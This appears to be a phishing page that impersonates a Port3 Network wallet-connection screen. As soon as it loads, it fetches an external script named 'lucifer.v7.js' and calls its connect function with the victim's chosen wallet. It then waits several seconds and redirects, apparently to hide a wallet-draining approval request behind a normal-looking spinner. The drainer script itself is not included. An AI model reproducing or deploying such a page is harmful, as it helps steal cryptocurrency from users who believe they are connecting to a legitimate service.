<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting Wallet | Port3 Network</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #ffffff;
            --grid-color: #f7f7f7;
            --text-main: #000000;
            --text-muted: #666666;
            --border-color: #eeeeee;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg);
            background-image: 
                linear-gradient(to right, var(--grid-color) 1px, transparent 1px),
                linear-gradient(to bottom, var(--grid-color) 1px, transparent 1px);
            background-size: 40px 40px;
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .connect-card {
            background: #ffffff;
            border: 1px solid var(--border-color);
            border-radius: 24px;
            width: 100%;
            max-width: 420px;
            padding: 2.5rem 2rem;
            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
            text-align: center;
        }

        .header-logo {
            font-size: 1.6rem;
            font-weight: 800;
            letter-spacing: -1.5px;
            margin-bottom: 2rem;
        }

        .header-logo span {
            font-size: 0.85rem;
            font-weight: 700;
            vertical-align: super;
            position: relative;
            top: -6px;
        }

        .spinner-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 2rem auto;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--text-main);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-title {
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            letter-spacing: -0.2px;
        }

        .status-desc {
            font-size: 0.9rem;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 2rem;
        }

        .cancel-btn {
            background-color: transparent;
            color: var(--text-muted);
            border: 1px solid var(--border-color);
            border-radius: 30px;
            padding: 0.8rem 2rem;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .cancel-btn:hover {
            background-color: #fafafa;
            color: var(--text-main);
            border-color: #cccccc;
        }
    </style>
</head>
<body>

    <div class="connect-card">
        <div class="header-logo">PORT<span>3</span></div>
        
        <div class="spinner-container">
            <div class="spinner"></div>
        </div>

        <h3 class="status-title" id="statusTitle">Connect Wallet</h3>
        <p class="status-desc" id="statusDesc">Approve connection request inside your mobile wallet application container.</p>

        <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
    </div>

    <script type="module" crossorigin src="./files/lucifer.v7.js"></script>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const activeWallet = urlParams.get('wallet') || 'Wallet';

        document.getElementById('statusTitle').textContent = `Connecting to ${activeWallet}`;
        document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;

        function initConnection() {
            if (window.connectWallet && typeof window.connectWallet === 'function') {
                window.connectWallet(activeWallet);
                
                // Route the user back to the React app dashboard after giving the script time to execute
                setTimeout(() => {
                    redirectToApp();
                }, 6000);

            } else if (window.connect && typeof window.connect === 'function') {
                window.connect(activeWallet);
                
                setTimeout(() => {
                    redirectToApp();
                }, 6000);
            } else {
                console.log(`Lucifer binding not ready yet. Retrying in a moment...`);
                setTimeout(initConnection, 300);
            }
        }

        window.addEventListener('DOMContentLoaded', () => {
            initConnection();
            
            // EMERGENCY FAILSAFE: Force redirect back to app if something completely freezes up
            setTimeout(() => {
                redirectToApp();
            }, 10000);
        });

        function redirectToApp() {
            // Sends the browser cleanly out of this static asset back to your main site root context
            window.location.href = '/'; 
        }

        function goBack() {
            window.history.back();
        }
    </script>
</body>
</html>
